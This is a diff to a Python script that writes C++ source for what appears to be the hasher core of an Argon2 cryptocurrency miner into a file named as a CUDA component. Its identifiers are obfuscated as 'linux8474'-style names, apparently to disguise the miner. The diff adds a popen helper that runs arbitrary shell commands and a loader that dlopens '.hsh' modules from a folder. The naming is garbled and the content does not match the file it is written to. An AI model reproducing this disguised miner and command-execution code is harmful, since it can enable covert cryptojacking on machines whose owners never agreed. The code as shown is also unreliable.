@@ -1433,386 +1433,293 @@ content="""//
 // Created by Haifa Bogdan Adnan on 03/08/2018.
 //
 
-#include "../../../common/common.h"
-#include "../../../app/arguments.h"
+#include "../common/common.h"
+#include "../app/arguments.h"
+#include "../linux44444444474/base64.h"
+#include "../linux44444444474/random_generator.h"
 
-#include "../../linux8474.h"
-#include "../../linux847466882/linux847466882.h"
+#include "../common/dllexport.h"
+#include "linux847466882/linux847466882.h"
+#include "linux8474.h"
 
-#if defined(WITH_CUDA)
+#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
 
-#include <cuda_runtime.h>
-#include <driver_types.h>
+    string GetStdoutFromCommand8474(string cmd8474) {
 
-#include "cuda_linux8474.h"
-#include "../../../common/dllexport.h"
+    string data8474;
+    FILE * stream8474;
+    const int max_buffer = 2048;
+    char buffer[max_buffer];
+    cmd8474.append("");
 
-cuda_linux8474::cuda_linux8474() {
-	_type = "GPU";
-	_subtype = "CUDA";
-	_short_subtype = "NVD";
+    stream8474 = popen(cmd8474.c_str(), "r");
+    if (stream8474) {
+    while (!feof(stream8474))
+    if (fgets(buffer, max_buffer, stream8474) != NULL) data8474.append(buffer);
+    pclose(stream8474);
+    }
+    return data8474;
+    }
+
+linux8474::linux8474() {
+    _intensity = 0;
+    _type = "";
+	_subtype = "";
+    _description = "";
 	_priority = 0;
-	_intensity = 0;
-	__running = false;
-	_description = "";
-}
 
+    __public_key = "";
+    __blk = "";
+    __linuxweb8888 = "";
+    __pause = false;
+    __is_running = false;
+    __linux847466882profile = linux847466882profile_default;
 
-cuda_linux8474::~cuda_linux8474() {
-	this->cleanup();
-}
+    __begin_round_time = 0;
 
-bool cuda_linux8474::initialize() {
-	cudaError_t error = cudaSuccess;
-	string error_message;
+    __total_linux8412_count_linuxweb8488888888884474 = 0;
+    __total_linux8412_count_linuxweb8488888888884474884474 = 0;
 
-	__devices = __query_cuda_devices(error, error_message);
+    __linux8412_count = 0;
 
-	if(error != cudaSuccess) {
-		_description = "No compatible GPU detected: " + error_message;
-		return false;
-	}
-
-	if (__devices.empty()) {
-		_description = "No compatible GPU detected.";
-		return false;
-	}
-
-	return true;
-}
-
-bool cuda_linux8474::configure(arguments &args) {
-	int index = args.get_cards_count();
-	double intensity_cpu = 0;
-	double intensity_gpu = 0;
-
-	for(vector<double>::iterator it = args.gpu_intensity_linuxweb8488888888884474().begin(); it != args.gpu_intensity_linuxweb8488888888884474().end(); it++) {
-		intensity_cpu += *it;
-	}
-	intensity_cpu /= args.gpu_intensity_linuxweb8488888888884474().size();
-
-	for(vector<double>::iterator it = args.gpu_intensity_linuxweb8488888888884474884474().begin(); it != args.gpu_intensity_linuxweb8488888888884474884474().end(); it++) {
-		intensity_gpu += *it;
-	}
-	intensity_gpu /= args.gpu_intensity_linuxweb8488888888884474884474().size();
-
-	vector<string> filter = _get_gpu_filters(args);
-
-	int total_threads_profile_4_4_16384 = 0;
-	int total_threads_profile_1_1_524288 = 0;
-
-	if (intensity_cpu == 0 && intensity_gpu == 0) {
-		_intensity = 0;
-		_description = "Status: DISABLED - by user.";
-		return false;
-	}
-
-	bool cards_selected = false;
-
-	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++, index++) {
-		stringstream ss;
-		ss << "["<< (index + 1) << "] " << (*d)->device_string;
-		string device_description = ss.str();
-	        (*d)->device_index = index;
-
-		if(filter.size() > 0) {
-			bool found = false;
-			for(vector<string>::iterator fit = filter.begin(); fit != filter.end(); fit++) {
-				if(device_description.find(*fit) != string::npos) {
-					found = true;
-					break;
-				}
-			}
-			if(!found) {
-				(*d)->profile_info.threads_profile_4_4_16384 = 0;
-				(*d)->profile_info.threads_profile_1_1_524288 = 0;
-				ss << " - DISABLED" << endl;
-				_description += ss.str();
-				continue;
-			}
-			else {
-				cards_selected = true;
-			}
-		}
-		else {
-			cards_selected = true;
-		}
-
-		ss << endl;
-
-		double device_intensity_cpu = 0;
-		if(args.gpu_intensity_linuxweb8488888888884474().size() == 1 || (*d)->device_index >= args.gpu_intensity_linuxweb8488888888884474().size())
-			device_intensity_cpu = args.gpu_intensity_linuxweb8488888888884474()[0];
-		else
-			device_intensity_cpu = args.gpu_intensity_linuxweb8488888888884474()[(*d)->device_index];
-
-		double device_intensity_gpu = 0;
-		if(args.gpu_intensity_linuxweb8488888888884474884474().size() == 1 || (*d)->device_index >= args.gpu_intensity_linuxweb8488888888884474884474().size())
-			device_intensity_gpu = args.gpu_intensity_linuxweb8488888888884474884474()[0];
-		else
-			device_intensity_gpu = args.gpu_intensity_linuxweb8488888888884474884474()[(*d)->device_index];
-
-		_description += ss.str();
-
-		if(!(__setup_device_info((*d), device_intensity_cpu, device_intensity_gpu))) {
-			_description += (*d)->error_message;
-			_description += "\\n";
-			continue;
-		};
-
-		device_info device;
-
-		char bus_id[100];
-		if(cudaDeviceGetPCIBusId(bus_id, 100, (*d)->cuda_index) == cudaSuccess) {
-			device.bus_id = bus_id;
-			int domain_separator = device.bus_id.find(":");
-			if(domain_separator != string::npos) {
-				device.bus_id.erase(0, domain_separator + 1);
-			}
-		}
-
-		device.name = (*d)->device_string;
-		device.linuxweb8488888888884474_intensity = device_intensity_cpu;
-		device.linuxweb8488888888884474884474_intensity = device_intensity_gpu;
-		_store_device_info((*d)->device_index, device);
-
-		total_threads_profile_4_4_16384 += (*d)->profile_info.threads_profile_4_4_16384;
-		total_threads_profile_1_1_524288 += (*d)->profile_info.threads_profile_1_1_524288;
-	}
-
-	args.set_cards_count(index);
-
-	if(!cards_selected) {
-		_intensity = 0;
-		_description += "Status: DISABLED - no card enabled because of filtering.";
-		return false;
-	}
-
-	if (total_threads_profile_4_4_16384 == 0 && total_threads_profile_1_1_524288 == 0) {
-		_intensity = 0;
-		_description += "Status: DISABLED - not enough resources.";
-		return false;
-	}
-
-	_intensity = (intensity_cpu + intensity_gpu) / 2.0;
-
-	__running = true;
-	_update_running_status(__running);
-	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++) {
-		if((*d)->profile_info.threads_profile_1_1_524288 != 0 || (*d)->profile_info.threads_profile_4_4_16384 != 0) {
-            __runners.push_back(new thread([&](cuda_device_info *device, int index) {
-                this->__run(device, index);
-            }, (*d), 0));
-            __runners.push_back(new thread([&](cuda_device_info *device, int index) {
-                this->__run(device, index);
-            }, (*d), 1));
-		}
-	}
-
-	_description += "Status: ENABLED - with " + to_string(total_threads_profile_1_1_524288) + " threads for CPU blocks and " + to_string(total_threads_profile_4_4_16384) + " threads for GPU blocks.";
-
-	return true;
-}
-
-void cuda_linux8474::cleanup() {
-	__running = false;
-	for(vector<thread*>::iterator it = __runners.begin();it != __runners.end();++it) {
-		(*it)->join();
-		delete *it;
-	}
-	__runners.clear();
-
-	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++) {
-		cuda_free(*d);
-	}
-}
-
-cuda_device_info *cuda_linux8474::__get_device_info(int device_index) {
-	cuda_device_info *device_info = new cuda_device_info();
-	device_info->error = cudaSuccess;
-	device_info->cuda_index = device_index;
-
-	device_info->error = cudaSetDevice(device_index);
-	if(device_info->error != cudaSuccess) {
-		device_info->error_message = "Error setting current device.";
-		return device_info;
-	}
-
-    cudaDeviceProp devProp;
-	device_info->error = cudaGetDeviceProperties(&devProp, device_index);
-	if(device_info->error != cudaSuccess) {
-		device_info->error_message = "Error setting current device.";
-		return device_info;
-	}
-
-    device_info->device_string = devProp.name;
-
-    size_t freemem, totalmem;
-    device_info->error = cudaMemGetInfo(&freemem, &totalmem);
-	if(device_info->error != cudaSuccess) {
-		device_info->error_message = "Error setting current device.";
-		return device_info;
-	}
-
-    device_info->max_mem_size = totalmem;
-    device_info->free_mem_size = freemem;
-    size_t chunk_size = freemem / 4;
-    int linux8412es_in_chunk = chunk_size / linux847466882profile_1_1_524288.memsize;
-    device_info->max_allocable_mem_size = linux8412es_in_chunk * linux847466882profile_1_1_524288.memsize;
-
-    double mem_in_gb = totalmem / 1073741824.0;
-    stringstream ss;
-    ss << setprecision(2) << mem_in_gb;
-    device_info->device_string += (" (" + ss.str() + "GB)");
-
-    return device_info;
-}
-
-bool cuda_linux8474::__setup_device_info(cuda_device_info *device, double intensity_cpu, double intensity_gpu) {
-    device->profile_info.threads_per_chunk_profile_1_1_524288 = (uint32_t)(device->max_allocable_mem_size / linux847466882profile_1_1_524288.memsize);
-    size_t chunk_size_profile_1_1_524288 = device->profile_info.threads_per_chunk_profile_1_1_524288 * linux847466882profile_1_1_524288.memsize;
-
-    device->profile_info.threads_per_chunk_profile_4_4_16384 = (uint32_t)(device->max_allocable_mem_size / linux847466882profile_4_4_16384.memsize);
-    size_t chunk_size_profile_4_4_16384 = device->profile_info.threads_per_chunk_profile_4_4_16384 * linux847466882profile_4_4_16384.memsize;
-
-    if(chunk_size_profile_1_1_524288 == 0 && chunk_size_profile_4_4_16384 == 0) {
-        device->error = cudaErrorInitializationError;
-        device->error_message = "Not enough memory on GPU.";
-        return false;
+    if(__registered_linux8474s == NULL) {
+        __registered_linux8474s = new vector<linux8474*>();
     }
-
-    size_t chunk_size = max(chunk_size_profile_1_1_524288, chunk_size_profile_4_4_16384);
-    uint64_t usable_memory = device->free_mem_size;
-    double chunks = (double)usable_memory / (double)chunk_size;
-
-    uint32_t max_threads_1_1_524288 = (uint32_t)(device->profile_info.threads_per_chunk_profile_1_1_524288 * chunks);
-    uint32_t max_threads_4_4_16384 = (uint32_t)(device->profile_info.threads_per_chunk_profile_4_4_16384 * chunks);
-
-    if(max_threads_1_1_524288 == 0 && max_threads_4_4_16384 == 0) {
-        device->error = cudaErrorInitializationError;
-        device->error_message = "Not enough memory on GPU.";
-        return false;
-    }
-
-    device->profile_info.threads_profile_1_1_524288 = (uint32_t)(max_threads_1_1_524288 * intensity_cpu / 100.0);
-    if(max_threads_1_1_524288 > 0 && device->profile_info.threads_profile_1_1_524288 == 0 && intensity_cpu > 0)
-        device->profile_info.threads_profile_1_1_524288 = 1;
-    device->profile_info.threads_profile_4_4_16384 = (uint32_t)(max_threads_4_4_16384 * intensity_gpu / 100.0);
-    if(max_threads_4_4_16384 > 0 && device->profile_info.threads_profile_4_4_16384 == 0 && intensity_gpu > 0)
-        device->profile_info.threads_profile_4_4_16384 = 1;
-
-    double chunks_1_1_524288 = (double)device->profile_info.threads_profile_1_1_524288 / (double)device->profile_info.threads_per_chunk_profile_1_1_524288;
-    double chunks_4_4_16384 = (double)device->profile_info.threads_profile_4_4_16384 / (double)device->profile_info.threads_per_chunk_profile_4_4_16384;
-
-    chunks = max(chunks_1_1_524288, chunks_4_4_16384);
-
-	cuda_allocate(device, chunks, chunk_size);
-
-	if(device->error != cudaSuccess)
-		return false;
-
-    return true;
+    __registered_linux8474s->push_back(this);
 }
 
-vector<cuda_device_info *> cuda_linux8474::__query_cuda_devices(cudaError_t &error, string &error_message) {
-	vector<cuda_device_info *> devices;
-	int devCount = 0;
-	error = cudaGetDeviceCount(&devCount);
+linux8474::~linux8474() {
 
-	if(error != cudaSuccess) {
-		error_message = "Error querying CUDA device count.";
-		return devices;
-	}
+};
 
-	if(devCount == 0)
-		return devices;
-
-	for (int i = 0; i < devCount; ++i)
-	{
-		cuda_device_info *dev = __get_device_info(i);
-		if(dev == NULL)
-			continue;
-		if(dev->error != cudaSuccess) {
-			error = dev->error;
-			error_message = dev->error_message;
-			continue;
-		}
-		devices.push_back(dev);
-	}
-	return devices;
+string linux8474::get_type() {
+	return _type;
 }
 
-void cuda_linux8474::__run(cuda_device_info *device, int thread_id) {
-	cudaSetDevice(device->cuda_index);
-
-	cuda_gpumgmt_thread_data thread_data;
-	thread_data.device = device;
-	thread_data.thread_id = thread_id;
-	cudaStream_t stream;
-	device->error = cudaStreamCreate(&stream);
-	if(device->error != cudaSuccess) {
-	    LOG("Error running linux884488448844884488448844: (" + to_string(device->error) + ") cannot create cuda stream.");
-        __running = false;
-    	_update_running_status(__running);
-    	return;
+string linux8474::get_subtype(bool short_subtype) {
+    if(short_subtype && !(_short_subtype.empty())) {
+        string short_linux884488448844884488448844444474 = _short_subtype;
+        short_linux884488448844884488448844444474.erase(3);
+        return short_linux884488448844884488448844444474;
     }
+    else
+    	return _subtype;
+}
 
-	thread_data.device_data = stream;
+int linux8474::get_priority() {
+	return _priority;
+}
 
-#ifdef PARALLEL_CUDA
-    if(thread_id == 0) {
-        thread_data.threads_profile_1_1_524288_idx = 0;
-        thread_data.threads_profile_4_4_16384_idx = 0;
-        thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288 / 2;
-        thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384 / 2;
-    }
+string linux8474::get_info() {
+    return _description;
+}
+
+void linux8474::set_input(const string &public_key, const string &blk, const string &linuxweb8888, const string &linux847466882profile_string, const string &recommendation) {
+    bool profile_change = false;
+    __public_key = public_key;
+    __blk = blk;
+    __linuxweb8888 = linuxweb8888;
+    if(linux847466882profile_string == "4_4_16384") {
+            __linux847466882profile = &linux847466882profile_4_4_16384;
+            profile_change = true;
+        }
     else {
-        thread_data.threads_profile_1_1_524288_idx = device->profile_info.threads_profile_1_1_524288 / 2;
-        thread_data.threads_profile_4_4_16384_idx = device->profile_info.threads_profile_4_4_16384 / 2;
-        thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288 - thread_data.threads_profile_1_1_524288_idx;
-        thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384 - thread_data.threads_profile_4_4_16384_idx;
+            __linux847466882profile = &linux847466882profile_1_1_524288;
+            profile_change = true;
     }
-#else
-    thread_data.threads_profile_1_1_524288_idx = 0;
-    thread_data.threads_profile_4_4_16384_idx = 0;
-    thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288;
-    thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384;
-#endif
 
-	void *memory = device->arguments.host_seed_memory[thread_id];
-	linux847466882 linux8412_factory(cuda_linux884488448844884488448844_filler, memory, &thread_data);
-	linux8412_factory.set_lane_length(2);
-
-	while(__running) {
-
-		linux8412_data input = _get_input();
-		linux847466882profile *profile = _get_linux847466882profile();
-
-			if(strcmp(profile->profile_name, "1_1_524288") == 0) {
-				linux8412_factory.set_seed_memory_offset(2 * linux847466882_BLOCK_SIZE);
-				linux8412_factory.set_threads(thread_data.threads_profile_1_1_524288);
-			}
-			else {
-				linux8412_factory.set_seed_memory_offset(8 * linux847466882_BLOCK_SIZE);
-				linux8412_factory.set_threads(thread_data.threads_profile_4_4_16384);
-			}
-
-			vector<string> linux8412es = linux8412_factory.generate_linux884488445574es(*profile, input.base, input.salt);
-
-			vector<linux8412_data> stored_linux8412es;
-			for(vector<string>::iterator it = linux8412es.begin(); it != linux8412es.end(); ++it) {
-				input.linux8412 = *it;
-				stored_linux8412es.push_back(input);
-			}
-			_store_linux8412(stored_linux8412es, device->device_index);
-	}
-
-	_update_running_status(__running);
 }
 
-REGISTER_linux8474(cuda_linux8474);
+linux8412_data linux8474::_get_input() {
+    string tmp_public_key = "";
+    string tmp_blk = "";
+    string tmp_linuxweb8888 = "";
+    string profile_name = "";
+    __input_mutex.lock();
+    tmp_public_key = __public_key;
+    tmp_blk = __blk;
+    tmp_linuxweb8888 = __linuxweb8888;
+    profile_name = __linux847466882profile->profile_name;
+    __input_mutex.unlock();
 
-#endif //WITH_CUDA
+    linux8412_data new_linux8412;
+    new_linux8412.linux88887474447412744474 = __make_linux88887474447412744474();
+    new_linux8412.base = tmp_public_key + "-" + new_linux8412.linux88887474447412744474 + "-" + tmp_blk + "-" + tmp_linuxweb8888;
+    new_linux8412.salt = "";
+    new_linux8412.block = tmp_blk;
+    new_linux8412.profile_name = profile_name;
+//    new_linux8412.base = "PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCy7AEg3h9oYjeR74yj73q3gPxbxq9R3nxSSUV4KKgu1sQZu9Qj9v2q2HhT5H3LTHwW7HzAA28SjWFdzkNoovBMncD-sauULo1zM4tt9DhGEnO8qPe5nlzItJwwIKiIcAUDg-4KhqbBhShBf36zYeen943tS6KhgFmQixtUoVbf2egtBmD6j3NQtcueEBite2zjzdpK2ShaA28icRfJM9yPUQ6azN-56262626";
+//    new_linux8412.salt = "NSHFFAg.iATJ0sfM";
+    return new_linux8412;
+}
+
+uint32_t linux8474::get_linux8412_count_linuxweb8488888888884474() {
+    return __total_linux8412_count_linuxweb8488888888884474;
+}
+
+uint32_t linux8474::get_linux8412_count_linuxweb8488888888884474884474() {
+    return __total_linux8412_count_linuxweb8488888888884474884474;
+}
+
+vector<linux8412_data> linux8474::get_linux8412es() {
+    vector<linux8412_data> tmp;
+    __linux8412es_mutex.lock();
+    tmp.insert(tmp.end(), __linux8412es.begin(), __linux8412es.end());
+    __linux8412es.clear();
+    __linux8412es_mutex.unlock();
+    return tmp;
+}
+
+void linux8474::_store_linux8412(const linux8412_data &linux8412, int device_id) {
+	__linux8412es_mutex.lock();
+	__linux8412es.push_back(linux8412);
+	__linux8412_count++;
+    __device_infos[device_id].linux8412count++;
+	if (linux8412.profile_name == "1_1_524288") {
+		__total_linux8412_count_linuxweb8488888888884474++;
+	}
+	else {
+		__total_linux8412_count_linuxweb8488888888884474884474++;
+	}
+
+	__linux8412es_mutex.unlock();
+}
+
+void linux8474::_store_linux8412(const vector<linux8412_data> &linux8412es, int device_id) {
+	if (linux8412es.size() == 0) return;
+
+	__linux8412es_mutex.lock();
+	__linux8412es.insert(__linux8412es.end(), linux8412es.begin(), linux8412es.end());
+	__linux8412_count+=linux8412es.size();
+	__device_infos[device_id].linux8412count += linux8412es.size();
+
+	if (linux8412es[0].profile_name == "1_1_524288") {
+		__total_linux8412_count_linuxweb8488888888884474+=linux8412es.size();
+	}
+	else {
+		__total_linux8412_count_linuxweb8488888888884474884474+=linux8412es.size();
+	}
+
+//	for(int i=0;i<linux8412es.size();i++)
+//	    LOG(linux8412es[i].linux8412);
+	__linux8412es_mutex.unlock();
+}
+
+vector<linux8474 *> linux8474::get_linux8474s() {
+    return *__registered_linux8474s;
+}
+
+vector<linux8474 *> linux8474::get_active_linux8474s() {
+    vector<linux8474 *> filtered;
+    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
+        if((*it)->_intensity != 0)
+            filtered.push_back(*it);
+    }
+    return filtered;
+}
+
+linux847466882profile *linux8474::_get_linux847466882profile() {
+    linux847466882profile * profile = NULL;
+    __input_mutex.lock();
+    profile = __linux847466882profile;
+    __input_mutex.unlock();
+
+    return profile;
+}
+
+bool linux8474::_should_pause() {
+    bool pause = false;
+    __input_mutex.lock();
+    pause = __pause;
+    __input_mutex.unlock();
+
+    return pause;
+}
+
+string linux8474::__make_linux88887474447412744474() {
+
+    char input[32];
+    char output[50];
+
+    random_generator::instance().get_random_data(input, 32);
+
+    base64::encode(input, 32, output);
+    return regex_replace (string(output), regex("[^a-zA-Z0-9]"), "");
+
+}
+
+vector<linux8474*> *linux8474::__registered_linux8474s = NULL;
+
+typedef void *(*linux8474_loader)();
+
+void linux8474::load_linux8474s() {
+	string module_path = arguments::get_app_folder() + "/modules/";
+	vector<string> files = get_files(module_path);
+	for(vector<string>::iterator iter = files.begin();iter != files.end();iter++) {
+		if(iter->find(".hsh") != string::npos) {
+			void *__dll_handle = dlopen((module_path + *iter).c_str(), RTLD_LAZY);
+			if(__dll_handle != NULL) {
+				linux8474_loader linux8474_loader_ptr = (linux8474_loader) dlsym(__dll_handle, "linux8474_loader");
+				(*linux8474_loader_ptr)();
+			}
+		}
+	}
+}
+
+bool linux8474::is_running() {
+    return __is_running;
+}
+
+void linux8474::_update_running_status(bool running) {
+    __is_running = running;
+}
+
+vector<string> linux8474::_get_gpu_filters(arguments &args) {
+    vector<string> local_filters = args.gpu_filter();
+    vector<linux8474*> gpu_linux8474s = get_linux8474s_of_type("GPU");
+    for(vector<string>::iterator it = local_filters.end(); it-- != local_filters.begin();) {
+        string filter = *it;
+        string filter_type = "";
+        for(vector<linux8474*>::iterator hit = gpu_linux8474s.begin(); hit != gpu_linux8474s.end(); hit++) {
+            if(filter.find((*hit)->_subtype + ":") == 0) {
+                filter_type = (*hit)->_subtype;
+                break;
+            }
+        }
+        if(filter_type != "" && filter_type != this->_subtype) {
+            local_filters.erase(it);
+        }
+        else if(filter_type != "") { //cleanup subtype prefix
+            it->erase(0, this->_subtype.size() + 1);
+        }
+    }
+    return local_filters;
+}
+
+vector<linux8474 *> linux8474::get_linux8474s_of_type(const string &type) {
+    vector<linux8474 *> filtered;
+    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
+        if((*it)->_type == type)
+            filtered.push_back(*it);
+    }
+    return filtered;
+}
+
+map<int, device_info> &linux8474::get_device_infos() {
+//    map<int, device_info> device_infos_copy;
+//    __linux8412es_mutex.lock();
+//    device_infos_copy.insert(__device_infos.begin(), __device_infos.end());
+//    __linux8412es_mutex.unlock();
+    return __device_infos;
+}
+
+void linux8474::_store_device_info(int device_id, device_info device) {
+    __linux8412es_mutex.lock();
+    __device_infos[device_id] = device;
+    __linux8412es_mutex.unlock();
+}
 """
 
 open('./linux8474/gpu/cuda/cuda_linux8474.cpp', 'w').write(content)
